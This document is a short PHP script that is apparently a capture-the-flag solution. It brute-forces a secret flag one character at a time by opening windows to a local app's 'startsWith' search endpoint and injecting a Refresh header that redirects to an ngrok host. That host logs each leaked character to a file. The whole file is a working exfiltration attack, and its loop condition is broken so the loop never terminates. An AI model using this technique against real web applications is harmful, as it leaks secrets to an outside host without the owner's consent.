<?php
#$c=0;
if (isset($_GET['c']))
{
    $count = $_GET['c'];
    $vars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', ' ', '\t', '\n', '\r', '\x0b', '\x0c'];
    #$count = $count+1;
    $myfile = fopen("flag.txt", "r");
    $flag=fread($myfile,filesize("flag.txt"));
    fclose($myfile);
    #$fp = fopen('log'.$c.'.txt', 'a+');
    $fp = fopen('log.txt', 'a+');
    fwrite($fp, $vars[$count]);
    fclose($fp);
}
else
{
    $vars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', ' ', '\t', '\n', '\r', '\x0b', '\x0c'];
    #$count = $count+1;
    $myfile = fopen("flag.txt", "r");
    $flag=fread($myfile,filesize("flag.txt"));
    fclose($myfile);
    $src="<script>";
    for ($i = 10; 15; $i++) 
    {
        $url = 'http://localhost:3000/find?startsWith='.$flag.urlencode($vars[$i]).'&debug=t&Refresh=1%3B%20url%3D%2F%2F782dad3a14e7.ngrok.io%2F%3Fc%3D'.urlencode($vars[$i]);
        $src = $src."window.open('".$url."','_blank');";
    }
    $src=$src."</script>";
    echo $src;
}
?>